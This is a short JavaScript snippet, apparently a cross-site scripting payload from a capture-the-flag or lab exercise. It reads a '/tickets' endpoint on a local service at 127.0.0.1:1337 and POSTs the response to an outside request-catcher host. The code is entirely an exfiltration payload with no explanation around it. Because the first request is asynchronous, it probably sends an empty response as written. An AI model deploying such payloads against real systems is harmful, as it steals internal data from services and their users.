const xhr = new XMLHttpRequest();
xhr.open("GET", "http://127.0.0.1:1337/tickets",true);
xhr.send();
var v = xhr.responseText;

let req = new XMLHttpRequest();
req.open("POST", "https://lemon.requestcatcher.com/", true);
req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
let data = v;
req.send(data);
